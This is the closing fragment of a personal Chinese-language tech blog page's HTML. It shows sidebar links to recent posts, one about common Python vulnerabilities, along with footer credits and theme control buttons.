onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python常见漏洞"/></a><div class="content"><a class="title" href="/2026/05/23/Python%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" title="Python常见漏洞">Python常见漏洞</a><time datetime="2026-05-23T14:01:03.000Z" title="发表于 2026-05-23 22:01:03">2026-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/04/2025-11-04-%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客"><img src="/assets/sea.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="我的第一篇博客"/></a><div class="content"><a class="title" href="/2025/11/04/2025-11-04-%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客">我的第一篇博客</a><time datetime="2025-11-03T16:00:00.000Z" title="发表于 2025-11-04 00:00:00">2025-11-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By car5ot</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
